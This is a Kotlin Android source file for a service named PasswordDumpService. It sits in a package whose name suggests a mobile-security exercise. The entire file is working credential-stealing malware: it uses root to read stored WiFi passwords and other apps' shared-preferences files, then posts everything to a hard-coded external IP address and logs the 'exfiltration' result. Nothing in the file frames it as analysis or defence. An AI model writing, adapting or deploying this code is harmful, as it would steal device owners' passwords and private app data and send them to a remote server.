package com.example.mobsec_823.malicious

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.BufferedReader
import java.io.InputStreamReader
import java.lang.StringBuilder

class PasswordDumpService : Service() {

    private val TAG = "PasswordDumpService"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        Thread {
            val dumpedData = dumpStoredPasswords()
            Log.d(TAG, "Password data collected, sending to backend...")
            sendToAttackerBackend(dumpedData)
        }.start()
        return START_STICKY
    }

    private fun dumpStoredPasswords(): String {
        val sb = StringBuilder("=== STORED PASSWORDS DUMP ===\n\n")

        // WiFi passwords (requires root)
        sb.append("--- WiFi Passwords ---\n")
        val wifiData = executeRootCommand("cat /data/misc/wifi/wpa_supplicant.conf")
        if (wifiData != null) {
            sb.append(wifiData)
        } else {
            sb.append("No root access or file not found\n")
            Log.w(TAG, "Failed to dump WiFi passwords (likely no root)")
        }

        // SharedPreferences from all apps
        sb.append("\n--- SharedPreferences ---\n")
        val prefsList = executeRootCommand("find /data/data -name \"*.xml\" -path \"*/shared_prefs/*\" 2>/dev/null")
        prefsList?.let { list ->
            val files = list.lines().filter { it.isNotBlank() }.take(50)
            files.forEach { file ->
                sb.append("\nFile: $file\n")
                sb.append(executeRootCommand("cat \"$file\"") ?: "Failed\n")
            }
        } ?: sb.append("No root access for data folder\n")

        return sb.toString()
    }

    private fun executeRootCommand(command: String): String? {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
                StringBuilder().apply {
                    reader.forEachLine { append(it).append("\n") }
                }.toString()
            }.also { process.waitFor() }
        } catch (e: Exception) {
            null
        }
    }

    private fun sendToAttackerBackend(data: String) {
        try {
            val client = OkHttpClient()
            val requestBody = data.toRequestBody("text/plain".toMediaType())
            val request = Request.Builder()
                .url("http://47.129.144.9:8000/dump/passwords")
                .post(requestBody)
                .build()
            
            Log.d(TAG, "Attempting connection to http://47.129.144.9:8000/dump/passwords")
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.i(TAG, "Password exfiltration successful")
                } else {
                    Log.e(TAG, "Password exfiltration failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error during Password exfil: ${e.message}")
        }
    }
}